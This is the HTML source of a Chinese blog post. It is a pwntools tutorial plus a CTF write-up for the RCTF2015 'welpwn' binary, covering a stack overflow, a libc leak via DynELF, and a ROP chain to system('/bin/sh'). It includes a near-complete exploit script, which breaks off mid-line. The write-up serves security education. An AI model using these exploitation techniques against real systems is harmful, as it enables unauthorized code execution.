@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Pwntools | qianmu's blog</title><meta name="author" content="qianmu"><meta name="copyright" content="qianmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基于pwntools编写pwn代码背景pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。 1.Pwntools安装及模块（已装） 1）安装 安装命令：pip install –upgrade pwntools 安装完毕后在python环境下只需使用 from pwn import * 即可导入 这会将大量的功能导入到全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwntools">
+<meta property="og:url" content="https://qianmuoy.github.io/2024/03/09/Pwntools/index.html">
+<meta property="og:site_name" content="qianmu&#39;s blog">
+<meta property="og:description" content="基于pwntools编写pwn代码背景pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。 1.Pwntools安装及模块（已装） 1）安装 安装命令：pip install –upgrade pwntools 安装完毕后在python环境下只需使用 from pwn import * 即可导入 这会将大量的功能导入到全">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-03-09T12:35:54.000Z">
+<meta property="article:modified_time" content="2024-03-09T12:36:06.932Z">
+<meta property="article:author" content="qianmu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qianmuoy.github.io/2024/03/09/Pwntools/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pwntools',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-09 20:36:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="qianmu's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="qianmu's blog"><span class="site-name">qianmu's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pwntools</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-03-09T12:35:54.000Z" title="Created 2024-03-09 20:35:54">2024-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-03-09T12:36:06.932Z" title="Updated 2024-03-09 20:36:06">2024-03-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Pwntools"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="基于pwntools编写pwn代码"><a href="#基于pwntools编写pwn代码" class="headerlink" title="基于pwntools编写pwn代码"></a>基于pwntools编写pwn代码</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。</p>
+<p><strong>1.Pwntools安装及模块（已装）</strong></p>
+<p>1）安装</p>
+<p>安装命令：pip install –upgrade pwntools</p>
+<p>安装完毕后在python环境下只需使用 from pwn import * 即可导入</p>
+<p>这会将大量的功能导入到全局命名空间，然后我们就可以直接使用单一的函数进行汇编、反汇编、pack,unpack等操作。</p>
+<p>2）常用模块如下</p>
+<p>asm：汇编与反汇编，支持x86&#x2F;x64&#x2F;arm&#x2F;mips&#x2F;powerpc等基本上所有的主流平台</p>
+<p>dynelf：用于远程符号泄漏，需要提供leak方法</p>
+<p>elf：对elf文件进行操作</p>
+<p>gdb：配合gdb进行调试</p>
+<p>memleak：用于内存泄漏</p>
+<p>shellcraft：shellcode的生成器</p>
+<p>tubes：包括tubes.sock,tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</p>
+<p>utils：一些实用的小功能，例如CRC计算，cyclic pattern等</p>
+<p><strong>2.常用模块详细介绍</strong></p>
+<p><strong>1）Tubes读写接口</strong></p>
+<p>这是exploit最为基础的部分，对于一次攻击而言前提就是与目标服务器或者程序进行交互，这里就可以使用remote（address, port）产生一个远程的socket然后就可以读写了。</p>
+<p>先来看看pwntools建立连接的功能，在kali上开启ftp服务：</p>
+<p>service vsftpd start</p>
+<p><img src="/.io//image-20240210144725321.png" alt="image-20240210144725321"></p>
+<p>这里是模拟了使用anonymous用户登录ftp服务的场景</p>
+<p>pwntools还有创建监听器的功能，如下所示</p>
+<p><img src="/.io//image-20240210144749507.png" alt="image-20240210144749507"></p>
+<p>上图中是自动监听41375端口，然后模仿发送hello消息，然后使用recv()进行接收。</p>
+<p>通过pwnlib.tubes.process可以与进程进行交互</p>
+<p><img src="/.io//image-20240210144849721.png" alt="image-20240210144849721"></p>
+<p>上图中是与&#x2F;bin&#x2F;sh进行交互，打印hello world</p>
+<p>我们不单单可以通过编程的方式事先写好与进程交互的逻辑，还可以直接与进程交互</p>
+<p><img src="/.io//image-20240210144917152.png" alt="image-20240210144917152"></p>
+<p>上图中通过interactive()进入了交互模式</p>
+<p>无论哪种PIPE都是继承tube而来，可以用于读写函数主要有:</p>
+<p>interactive()：直接进行交互，相当于回到shell的模式，在取得shell之后使用</p>
+<p>recv(numb&#x3D;4096, timeout&#x3D;default)：接收指定字节</p>
+<p>recvall()：一直接收直到EOF</p>
+<p>recvline(keepends&#x3D;True)：接收一行，keepends为是否保留行尾的\n</p>
+<p>recvuntil(delims, drop&#x3D;False)：一直读到delims的pattern出现为止</p>
+<p>recvrepeat(timeout&#x3D;default)：持续接受直到EOF或timeout</p>
+<p>send(data)：发送数据</p>
+<p>sendline(data)：发送一行数据，相当于在数据末尾加\n</p>
+<p><strong>2）汇编与反汇编</strong></p>
+<p>使用asm进行汇编</p>
+<p><img src="/.io//image-20240210144958929.png" alt="image-20240210144958929"></p>
+<p>使用disasm进行反汇编</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> disasm(<span class="string">&#x27;6a0258cd80ebf9&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20240210145024530.png" alt="image-20240210145024530"></p>
+<p><strong>3）shellcode生成器</strong></p>
+<p>使用shellcraft可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20240210145241417.png" alt="image-20240210145241417"></p>
+<p>如上所示，如果需要在64位的Linux上执行&#x2F;bin&#x2F;sh就可以使用shellcraft.amd64.linux.sh()，配合asm函数就能够得到最终的pyaload了。</p>
+<p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。</p>
+<p><strong>4）elf文件操作</strong></p>
+<p>在进行elf文件逆向的时候，总是需要对各个符号的地址进行分析，elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置</p>
+<p>下图分别是打印文件装载的基地址、函数地址、GOT表的地址、PLT表的地址</p>
+<p><img src="/.io//image-20240210145319039.png" alt="image-20240210145319039"></p>
+<p>其他可用的函数还包括：</p>
+<p>asm(address, assembly)：在指定地址进行汇编</p>
+<p>bss(offset)：返回bss段的位置，offset是偏移值</p>
+<p>checksec()：对elf进行一些安全保护检查，例如NX,PIE等。</p>
+<p>disasm(address, n_bytes)：在指定位置进行n_bytes个字节的反汇编</p>
+<p>offset_to_vaddr(offset)：将文件中的偏移offset转换成虚拟地址VMA</p>
+<p>vaddr_to_offset(address)：与上面的函数作用相反</p>
+<p>read(address, count)：在address(VMA)位置读取count个字节</p>
+<p>write(address, data)：在address(VMA)位置写入data</p>
+<p>section(name)：dump出指定section的数据</p>
+<p><strong>5）ROP链生成器</strong></p>
+<p>回顾一下ROP的原理，由于NX开启不能在栈上执行shellcode，我们可以在栈上布置一系列的返回地址与参数，这样可以进行多次的函数调用，通过函数尾部的ret语句控制程序的流程，而用程序中的一些pop&#x2F;ret的代码块(称之为gadget)来平衡堆栈。其完成的事情无非就是放上&#x2F;bin&#x2F;sh，覆盖程序中某个函数的GOT为system的，然后ret到那个函数的plt就可以触发system(‘&#x2F;bin&#x2F;sh’)。由于是利用ret指令的exploit，所以叫Return-Oriented Programming。</p>
+<p>这种技术的难点自然就是如何在栈上布置返回地址以及函数参数。而pwntools的ROP模块的作用，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。</p>
+<p>使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数</p>
+<p><img src="/.io//image-20240210145421362.png" alt="image-20240210145421362"></p>
+<p>ROP对象实现了__getattr__的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。</p>
+<p><img src="/.io//image-20240210145440379.png" alt="image-20240210145440379"></p>
+<p>其他常用函数包括：</p>
+<p>call(resolvable, arguments&#x3D;())：添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</p>
+<p>chain()：返回当前的字节序列，即payload</p>
+<p>dump()：直观地展示出当前的ropchain</p>
+<p>raw()：在rop chain中加上一个整数或字符串</p>
+<p>search(move&#x3D;0, regs&#x3D;None, order&#x3D;’size’)：按特定条件搜索gadget，没仔细研究过</p>
+<p>unresolve(value)：给出一个地址，反解析出符号</p>
+<p>另外，对于整数的pack与数据的unpack，可以使用p32,p64,u32,u64这些函数，分别对应着32位和64位的整数</p>
+<h2 id="使用pwntools实战CTF题目"><a href="#使用pwntools实战CTF题目" class="headerlink" title="使用pwntools实战CTF题目"></a><strong>使用pwntools实战CTF题目</strong></h2><p>题目来自RCTF2015,名为welpwn</p>
+<p>先看看程序的基本信息</p>
+<p><img src="/.io//image-20240210145925577.png" alt="image-20240210145925577"></p>
+<p>可以知道，这是64位linux下的二进制程序，无cookie</p>
+<p>通过IDA静态分析</p>
+<p><img src="/.io//image-20240210150053429.png" alt="image-20240210150053429"></p>
+<p>main函数</p>
+<p><img src="/.io//image-20240210150109984.png" alt="image-20240210150109984"></p>
+<p><img src="/.io//image-20240210150116727.png" alt="image-20240210150116727"></p>
+<p>read()函数读取字节数为0x400,即十进制的1024，即read()读取1024个字节的数据，随后调用echo()</p>
+<p>定位到echo()</p>
+<p><img src="/.io//image-20240210150140123.png" alt="image-20240210150140123"></p>
+<p>可以看到echo函数的栈帧大小为20h</p>
+<p>echo的伪码</p>
+<p><img src="/.io//image-20240210150152033.png" alt="image-20240210150152033"></p>
+<p>可以知道，echo函数中存在循环赋值，循环的次数为read函数读的数据的长度</p>
+<p>由于echo函数的栈桢大小（20h）远小于read函数可以读取的数据长度(400h)，在进行循环赋值的时候，echo函数保存在栈中的返回地址会被覆盖。</p>
+<p>整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为welpwn的NX为enabled,即设置了栈不可执行，所以我们需要构造ROP链，这样肯定会在payload中包含“x00”字符。</p>
+<p>那么怎么绕过这个障碍呢？</p>
+<p>由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节（0x20h），故我们可以只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址(8字节)，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程。</p>
+<p>绕过这个障碍后，解题思路就很清晰了：</p>
+<p>-泄露libc，获取system,gets等函数地址</p>
+<p>-构造gets(bss);将’&#x2F;bin&#x2F;sh’写入bss段</p>
+<p>-构造’system(“&#x2F;bin&#x2F;sh”)’得到shell</p>
+<p>使用ROPgadgets寻找gadgets，用于构造ROP链条</p>
+<p>ROPgadget –binary .&#x2F;welpwn –only “opo|ret”</p>
+<p><img src="/.io//image-20240210150355752.png" alt="image-20240210150355752"></p>
+<p>找到main函数地址，用作返回地址</p>
+<p>objdump -d welpwn | grep main</p>
+<p><img src="/.io//image-20240210150427028.png" alt="image-20240210150427028"></p>
+<p>bss段开始地址，用于存储字符串(‘&#x2F;bin&#x2F;sh’)</p>
+<p>readelf -S welpwn | grep bss</p>
+<p><img src="/.io//image-20240210150505608.png" alt="image-20240210150505608"></p>
+<p>puts（plt）地址，用于泄露内存</p>
+<p>objdump -d welpwn | grep puts</p>
+<p><img src="/.io//image-20240210150544260.png" alt="image-20240210150544260"></p>
+<p>构造ROP链，泄露内存</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop = p64(poprdi) + p64(addr) +p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span> + p64(ppppr) +rop</span><br></pre></td></tr></table></figure>
+
+<p>利用pwnlib中DynELF模块泄露libc中system和puts地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line"></span><br><span class="line">rop = p64(poprdi) + p64(addr) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span> + p64(ppppr) + rop</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">27</span>)</span><br><span class="line"></span><br><span class="line">tmp = p.recv()</span><br><span class="line"></span><br><span class="line">data = tmp.split(<span class="string">&quot;\nWelcome&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(data):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;welpwn&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets = d.lookup(<span class="string">&#x27;gets&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>构造ROP链将’&#x2F;bin&#x2F;sh’写入bss段，并执行system(“&#x2F;bin&#x2F;sh”):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop = p64(poprdi) + p64(bss) + p64(gets) +p64(poprdi) + p64(bss) + p64(system) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">24</span> + p64(ppppr) +rop</span><br></pre></td></tr></table></figure>
+
+<p>运行后如图所示，拿到shell</p>
+<p><img src="/.io//image-20240210150719044.png" alt="image-20240210150719044"></p>
+<p><img src="/.io//image-20240210150728857.png" alt="image-20240210150728857"></p>
+<p>完整代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;welpwn&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;welpwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.symbols[<span class="string">&#x27;got.read&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;read_got = &quot;</span> + <span class="built_in">hex</span>(read_got))</span><br><span class="line"></span><br><span class="line">write_got = elf.symbols[<span class="string">&#x27;got.write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write_got = &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;main = &quot;</span> + <span class="built_in">hex</span>(main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buflen = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">mmmcall = <span class="number">0x400880</span></span><br><span class="line">ppppppr = <span class="number">0x40089a</span></span><br><span class="line">ppppr = <span class="number">0x40089c</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;Q&quot;</span> * buflen</span><br><span class="line">    payload += p64(ppppr)       </span><br><span class="line">    payload += p64(ppppppr)</span><br><span class="line">    rbx = <span class="number">0</span></span><br><span class="line">    rbp = <span class="number">1</span></span><br><span class="line">    r12 = write_got</span><br><span class="line">    r13 = <span class="number">8</span></span><br><span class="line">    r14 = address</span><br><span class="line">    r15 = <span class="number">1</span></span><br><span class="line">    ret = mmmcall</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">    ret = main</span><br><span class="line">    payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;RCTF\n&#x27;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        p.recv(<span class="number">0x1b</span>)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">&quot;recv: &quot;</span> + <span class="built_in">str</span>(data))</span><br><span class="line">    flag += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;welpwn&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;system addr = &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601300</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;P&quot;</span> * buflen</span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = read_got</span><br><span class="line">r13 = <span class="number">17</span></span><br><span class="line">r14 = bss</span><br><span class="line">r15 = <span class="number">0</span></span><br><span class="line">ret = mmmcall</span><br><span class="line">payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\0&quot;</span>+ p64(system))</span><br><span class="line"></span><br><span class="line">check = <span class="string">&quot;&quot;</span></span><br><span class="line">check += <span class="string">&quot;C&quot;</span> * buflen</span><br><span class="line">check += p64(ppppr)</span><br><span class="line">check += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = write_got</span><br><span class="line">r13 = <span class="number">16</span></span><br><span class="line">r14 = bss</span><br><span class="line">r15 = <span class="number">1</span></span><br><span class="line">ret = mmmcall</span><br><span class="line">check += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">check += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span 